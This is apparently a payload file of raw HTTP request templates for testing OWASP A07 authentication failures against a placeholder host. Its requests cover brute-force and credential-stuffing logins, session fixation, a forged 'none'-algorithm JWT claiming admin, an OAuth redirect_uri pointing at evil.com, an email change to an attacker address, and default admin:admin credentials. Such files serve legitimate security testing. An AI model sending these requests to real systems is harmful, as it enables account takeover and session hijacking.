# OWASP Top 10 - A07:2021 Identification and Authentication Failures
# Failles d'authentification

### Brute Force - Common passwords
POST /login HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=admin&password=123456

### Credential Stuffing
POST /api/auth HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 55

{"username": "user@email.com", "password": "Password123"}

### Session Fixation
GET /login?PHPSESSID=attacker_controlled_session HTTP/1.1
Host: {{host}}

### Weak Session ID
GET /dashboard HTTP/1.1
Host: {{host}}
Cookie: session_id=12345

### Session ID in URL
GET /dashboard?session=abc123def456 HTTP/1.1
Host: {{host}}

### Missing Multi-Factor Authentication
POST /admin/login HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 50

{"username": "admin", "password": "ValidPassword1"}

### Password Reset Token Prediction
GET /reset-password?token=123456 HTTP/1.1
Host: {{host}}

### Account Takeover via Email
POST /api/update-email HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 45

{"user_id": 999, "email": "attacker@evil.com"}

### JWT None Algorithm
GET /api/admin HTTP/1.1
Host: {{host}}
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.

### JWT Weak Secret
GET /api/data HTTP/1.1
Host: {{host}}
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

### OAuth Redirect URI Manipulation
GET /oauth/authorize?client_id=123&redirect_uri=https://evil.com/callback HTTP/1.1
Host: {{host}}

### Remember Me Token Theft
GET /dashboard HTTP/1.1
Host: {{host}}
Cookie: remember_me=stolen_token_value

### Default API Keys
GET /api/data?api_key=default_key_12345 HTTP/1.1
Host: {{host}}

### Hardcoded Credentials
POST /api/admin HTTP/1.1
Host: {{host}}
Authorization: Basic YWRtaW46YWRtaW4=
